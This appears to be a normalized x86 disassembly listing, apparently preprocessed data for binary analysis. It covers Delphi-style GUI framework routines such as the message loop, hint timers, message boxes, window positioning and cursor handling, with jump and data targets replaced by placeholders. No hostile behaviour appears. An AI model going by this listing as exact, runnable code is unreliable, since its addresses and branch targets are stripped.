mov edi eax
xor ebx ebx
mov eax [ esi + 0x4 ]
cmp eax 0x100
jb r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp eax 0x108
ja r-xdata
call GetCapture
mov ebp eax
test ebp ebp
jne r-xdata
push 0xfffffffa
push ebp
call GetWindowLongA
cmp eax [ rw-data ]
jne r-xdata
mov ebp [ esi ]
mov eax [ edi + 0x44 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov eax ebp
call sub_434238
test eax eax
jne r-xdata
cmp ebp [ eax + 0x254 ]
jne r-xdata
mov bl 0x1
test ebp ebp
jne r-xdata
test ebp ebp
jne r-xdata
call sub_43db40
mov ebp eax
jmp r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov ebp [ esi ]
push ebp
call GetParent
mov ebp eax
mov bl 0x1
jmp r-xdata
sub_456a8c
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebp eax
xor ebx ebx
mov esi [ ebp + 0x84 ]
test esi esi
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xdc ]
test al al
je r-xdata
mov eax ebp
call sub_4579ec
sub_456ac0
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov ebx eax
mov [ esp ] 0x0
cmp [ ebx + 0x12a ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov ecx esp
mov edx ebp
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
mov al 0x1
mov edi [ ebx + 0x44 ]
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov eax edi
call sub_43db40
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebp
mov eax [ ebx + 0x44 ]
mov si 0xffab
call sub_403430
test al al
jne r-xdata
sub_456b2c
push ebx
push esi
push edi
push ecx
mov edi edx
mov esi eax
xor ebx ebx
push 0x1
push 0x0
push 0x0
push 0x0
push edi
call PeekMessageA
test eax eax
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov bl 0x1
cmp [ edi + 0x4 ] 0x12
je r-xdata
mov [ esi + 0x9c ] 0x1
mov [ esp ] 0x0
cmp [ esi + 0xda ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_456a8c
test al al
jne r-xdata
mov ecx esp
mov edx edi
mov eax [ esi + 0xdc ]
call [ esi + 0xd8 ]
cmp [ esp ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_456984
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_4569d4
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_456960
test al al
jne r-xdata
push edi
call TranslateMessage
push edi
call DispatchMessageA
jmp r-xdata
sub_456bc4
push ebx
add esp 0xffffffe4
mov ebx eax
mov edx esp
mov eax ebx
call sub_456b2c
test al al
jne r-xdata
add esp 0x1c
pop ebx
retn
mov edx esp
mov eax ebx
call sub_457494
sub_456be8
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
call sub_413820
mov eax 0x8
call sub_4026bc
mov edx [ ebp + 0x8 ]
mov [ eax ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov edx eax
mov eax [ ebx + 0xa8 ]
call sub_4136e4
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebx
pop ebp
retn 0x8
lea edx [ ebp + 0x8 ]
push edx
push 0x0
push 0xb020
push eax
call SendMessageA
jmp r-xdata
sub_456c44
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
inc edi
xor esi esi
lea edx [ ebp + 0x8 ]
push edx
push 0x1
push 0xb020
push eax
call SendMessageA
jmp r-xdata
inc esi
dec edi
jne r-xdata
mov edx [ ebp + 0xc ]
cmp edx [ eax + 0x4 ]
jne r-xdata
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_413840
mov edx [ eax ]
cmp edx [ ebp + 0x8 ]
jne r-xdata
mov edx 0x8
call sub_4026dc
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_413730
jmp r-xdata
sub_456cd8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax ebx
call [ eax - 0xc ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
xor eax eax
push ebp
push j_sub_4036bc#3
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
or edx 0xffffffff
mov eax ebx
mov edi [ eax ]
call [ edi + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x44 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov edi ebx
mov eax edi
call sub_43db1c
mov [ esi + 0x44 ] edi
sub_456d58
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x1
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax sub_44dc60
call sub_4079f4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456e3d
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x0
retn
mov edx [ rw-data ]
mov edx [ edx ]
sub edx 0x3
je r-xdata
mov dl 0x2
call sub_45144c
sub edx 0x4
jne r-xdata
xor eax eax
push ebp
push j_sub_4036bc#2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_456bc4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x0
je r-xdata
mov [ eax + 0x22b ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov dl 0x1
call sub_450354
mov eax [ ebp - 0x4 ]
call sub_456728
jmp r-xdata
sub_456e58
push ebx
push esi
mov esi edx
mov ebx eax
call GetCapture
test eax eax
je r-xdata
call sub_40274c
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
call sub_40276c
push eax
call sub_40274c
pop edx
call sub_40b1d8
call sub_40274c
mov edx [ rw-data ]
call sub_4033c0
test al al
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0xd2 ] 0x0
je r-xdata
call sub_40274c
mov edx eax
mov eax ebx
call sub_457050
pop esi
pop ebx
retn
call sub_40274c
mov ecx eax
mov edx esi
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
jmp r-xdata
sub_456ee8
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
call GetActiveWindow
mov [ ebp - 0xc ] eax
push 0x2
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x14 ] eax
push 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
xor eax eax
call sub_44dce8
mov [ ebp - 0x10 ] eax
call sub_44dc04
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
call sub_455e8c
test al al
je r-xdata
mov [ ebp - 0x44 ] 0x28
lea eax [ ebp - 0x44 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
lea eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call GetWindowRect
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x3c ]
sub ecx edx
sar ecx 0x1
jns r-xdata
xor ecx ecx
push ebp
push r-xdata
push [ fs : ecx ]
mov [ fs : ecx ] esp
push ebx
push edi
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call MessageBoxA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457044
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
or ebx 0x100000
add ecx edx
push ecx
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x40 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
mov eax [ ebp - 0x10 ]
call sub_44dd9c
mov eax [ ebp - 0xc ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x1c ]
call sub_44dc0c
retn
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x48 ]
mov edx [ ebp - 0x50 ]
sub ecx edx
sar ecx 0x1
jns r-xdata
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
add ecx edx
push ecx
mov edx [ ebp - 0x4c ]
mov eax [ ebp - 0x54 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
sub_457050
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x108 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x4 ]
call sub_404004
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x10
lea edx [ ebp - 0x108 ]
mov eax ebx
call sub_456914
mov eax [ ebp - 0x108 ]
call sub_40442c
push eax
mov eax [ ebp - 0x4 ]
call sub_40442c
mov edx eax
mov eax ebx
pop ecx
call sub_456ee8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457112
lea eax [ ebp - 0x108 ]
call sub_403f6c
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
mov eax [ ebp - 0x4 ]
call sub_408194
mov edx eax
lea eax [ ebp - 0x104 ]
call sub_402d34
lea eax [ ebp - 0x104 ]
mov edx r-xdata
call sub_402b4c
jbe r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404234
sub_457128
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] dx
mov esi eax
xor ebx ebx
mov [ esp + 0x8 ] 0x1
mov eax [ rw-data ]
mov edi [ eax + 0x68 ]
test edi edi
je r-xdata
cmp [ esi + 0xf2 ] 0x0
je r-xdata
cmp [ edi + 0x2aa ] 0x0
je r-xdata
test edi edi
je r-xdata
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ esi + 0xf4 ]
call [ esi + 0xf0 ]
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ edi + 0x2ac ]
call [ edi + 0x2a8 ]
mov ebx eax
jmp r-xdata
cmp [ esp + 0x8 ] 0x0
je r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax ebx
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax edi
call sub_43dcdc
cmp ax 0xffff
jne r-xdata
mov [ esp + 0x8 ] 0x0
test edi edi
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
cmp [ esi + 0x50 ] 0x0
je r-xdata
mov eax edi
call sub_43de44
test al al
je r-xdata
cmp [ edi + 0x220 ] 0x0
jne r-xdata
cmp [ esi + 0xa4 ] 0x0
jne r-xdata
mov ebp [ esi + 0x30 ]
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
cmp [ edi + 0x23c ] 0x0
je r-xdata
mov [ esp + 0x8 ] 0x0
mov eax [ esp + 0x4 ]
push eax
movzx eax [ esp + 0x4 ]
push eax
push 0xb01f
mov eax [ esi + 0x30 ]
push eax
call PostMessageA
mov eax esi
call sub_4577cc
test al al
je r-xdata
call sub_43db40
mov ebp eax
mov eax edi
call sub_43db40
mov ebp eax
mov eax esi
call sub_4577cc
test al al
je r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ esi + 0x50 ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ edi + 0x23c ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
sub_457290
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_4577cc
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_458018
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0xc ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4572ef
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_4572f8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_4577cc
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_458018
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0x10 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457357
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_457368
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x88 ]
je r-xdata
pop esi
pop ebx
retn
mov eax edx
mov [ ebx + 0x88 ] al
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_403234
xor eax eax
mov [ ebx + 0x84 ] eax
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x2c ]
mov esi eax
mov [ ebx + 0x84 ] esi
mov edx [ ebx + 0x5c ]
mov eax esi
call sub_4374f8
jmp r-xdata
sub_4573b8
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_454964
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
call sub_43db40
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_454950
mov ebx eax
mov eax ebx
call sub_43de44
test al al
je r-xdata
mov eax ebx
call sub_43db40
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
sub_45741c
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx eax
push esp
call GetCursorPos
mov eax esp
mov dl 0x1
call sub_435c04
mov edi eax
call sub_434500
mov esi eax
cmp edi [ ebx + 0x48 ]
je r-xdata
mov eax edi
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x0
je r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x48 ] edi
cmp [ ebx + 0x48 ] 0x0
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb014
mov eax [ ebx + 0x48 ]
call sub_43850c
test esi esi
je r-xdata
test esi esi
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb013
mov eax [ ebx + 0x48 ]
call sub_43850c
sub_457494
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_45741c
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_4554cc
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_4344bc
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_457654
mov [ ebp - 0x5 ] 0x1
xor eax eax
push ebp
push j_sub_4036bc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x102 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
lea ecx [ ebp - 0x5 ]
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
mov eax [ ebp - 0x4 ]
call sub_4579ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4573b8
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor eax eax
call sub_419040
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4575ab
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f90
retn
call WaitMessage
mov [ ebp - 0x5 ] 0x0
sub_4575b4
push ebx
push esi
push edi
mov edi edx
mov eax [ rw-data ]
call sub_454948
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ rw-data ]
call sub_454934
movzx edx di
xor ecx ecx
call sub_43850c
inc esi
dec ebx
jne r-xdata
sub_4575f0
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_45670c
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_45670c
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
jmp r-xdata
mov dx 0xb01d
mov eax ebx
call sub_4575b4
pop ebx
retn
push 0xffffffff
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call InvalidateRect
sub_457654
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x54 ]
mov edx esi
call sub_404378
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
lea eax [ ebx + 0x54 ]
mov edx esi
call sub_403fc0
cmp [ ebx + 0xfa ] 0x0
je r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_431120
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_443ddc
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403430
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403234
retn
mov edx ebx
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
jmp r-xdata
sub_4576e8
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsWindowVisible
cmp eax 0x1
sbb eax eax
inc eax
cmp al [ rw-data ]
jne r-xdata
pop ebx
pop ebp
retn
cmp bl [ rw-data ]
je r-xdata
xor eax eax
mov al bl
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
mov [ rw-data ] bl
sub_457744
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_454948
mov esi eax
dec esi
test esi esi
jl r-xdata
push ebp
xor eax eax
call sub_4576e8
pop ecx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_454934
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
push ebp
mov al 0x1
call sub_4576e8
pop ecx
jmp r-xdata
mov eax ebx
call sub_43de44
test al al
jne r-xdata
mov eax [ ebx + 0x190 ]
push eax
mov eax ebx
call sub_43db40
push eax
call IsChild
test eax eax
jne r-xdata
sub_4577cc
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x4c ] 0x0
jne r-xdata
cmp [ esi + 0x4c ] 0x0
je r-xdata
lea eax [ esi + 0x4c ]
call sub_4055a8
call sub_422ba4
mov eax ebx
pop esi
pop ebx
retn
mov bl 0x1
sub_4577f4
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov eax edi
call sub_457838
push sub_455524
push esi
push 0x0
push 0x0
call SetTimer
mov [ edi + 0x8a ] ax
mov [ edi + 0x89 ] bl
cmp [ edi + 0x8a ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4579ec
sub_457860
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebp ecx
mov edi edx
mov esi eax
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_406850
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_436e70
lea eax [ esp + 0x10 ]
mov dl 0x1
call sub_435c04
call sub_455504
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_4579ec
jmp r-xdata
cmp [ ebx + 0x99 ] 0x0
jne r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebx [ esi + 0x60 ]
jne r-xdata
mov al [ esi + 0x58 ]
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_406850
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_436e70
push [ esp + 0x14 ]
push [ esp + 0x14 ]
lea eax [ esi + 0x64 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esi + 0x78 ]
mov [ esp ] eax
mov eax [ esi + 0x80 ]
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_4579ec
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
xor ecx ecx
mov edx [ esp ]
mov eax esi
call sub_4577f4
cmp [ esp ] 0x0
jne r-xdata
mov eax esp
push eax
xor ecx ecx
mov cl [ esp + 0x8 ]
mov edx 0xb041
mov eax ebx
call sub_43850c
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
lea eax [ esp + 0x5 ]
push eax
call GetCursorPos
lea edx [ esp + 0x5 ]
mov eax esi
call sub_457c84
jmp r-xdata
sub_457970
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_457838
mov al [ ebx + 0x89 ]
sub al 0x1
jb r-xdata
push esp
call GetCursorPos
mov edx esp
mov eax ebx
call sub_457c84
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_4579a8
jmp r-xdata
sub_4579a8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x84 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_43de44
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_43db40
push eax
call IsWindowVisible
test eax eax
je r-xdata
push 0x0
mov eax [ ebx + 0x84 ]
call sub_43db40
push eax
call ShowWindow
sub_4579ec
push ebx
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
call sub_4579a8
xor eax eax
mov [ ebx + 0x60 ] eax
mov [ ebx + 0x58 ] 0x0
call sub_45568c
mov eax ebx
call sub_457838
sub_457a24
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x28 ]
push eax
call GetCursor
push eax
call GetIconInfo
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
call sub_41e438
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
call sub_4079a8
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ ebp - 0x10 ]
add ebx [ ebp - 0x8 ]
push ebx
mov esi [ ebp - 0x10 ]
mov ecx esi
xor edx edx
mov eax [ ebp - 0x1c ]
call sub_41e4f0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457b3e
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_4026dc
retn
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xe ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx eax
movzx ecx [ esi + 0xe ]
imul edx ecx
add edx 0x1f
and edx 0xffffffe0
test edx edx
jns r-xdata
sar edx 0x3
mov [ ebp - 0x14 ] edx
mov edi eax
imul edi [ ebp - 0x14 ]
add ebx [ ebp - 0xc ]
sub ebx edi
mov ecx 0xff
mov edx edi
mov eax ebx
call sub_457a14
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
add edx 0x7
mov eax [ ebp - 0x4 ]
cdq
idiv [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x20 ]
sub [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
add edx edx
cmp eax edx
jl r-xdata
mov eax ebx
sub eax edi
xor ecx ecx
mov edx edi
call sub_457a14
mov [ ebp - 0x4 ] eax
sub_457b3e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
push eax
call DeleteObject
retn
push eax
call DeleteObject
sub_457b78
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x84 ]
test esi esi
je r-xdata
mov ebx [ rw-data ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
call sub_403234
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov dl 0x1
mov eax ebx
call [ eax + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x84 ] eax
mov eax [ ebp + 0x8 ]
mov eax esi
call sub_40317c
cmp ebx eax
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_457bd8
push ebp
mov ebp esp
